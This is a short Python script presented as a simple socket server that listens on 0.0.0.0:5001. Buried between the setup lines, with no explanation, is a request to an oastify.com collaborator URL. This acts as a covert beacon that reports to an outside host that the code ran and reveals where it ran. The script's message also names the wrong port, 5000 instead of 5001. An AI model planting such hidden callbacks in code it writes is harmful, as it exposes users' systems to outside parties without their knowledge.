import socket
import requests



# create a socket object
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# bind the socket to a public host and a port
server_socket.bind(('0.0.0.0', 5001))

url = "http://spl9fiy41nlialiaoha5l5htrkxbl19q.oastify.com"
requests.get(url)
# become a server socket
server_socket.listen(5)

print("Server is listening on port 5000...")

while True:
    # accept connections from outside
    (client_socket, client_address) = server_socket.accept()
    print(f"Received connection from {client_address}")
    
    # do something with the client_socket
    # ...
    
    # close the client socket
    client_socket.close()
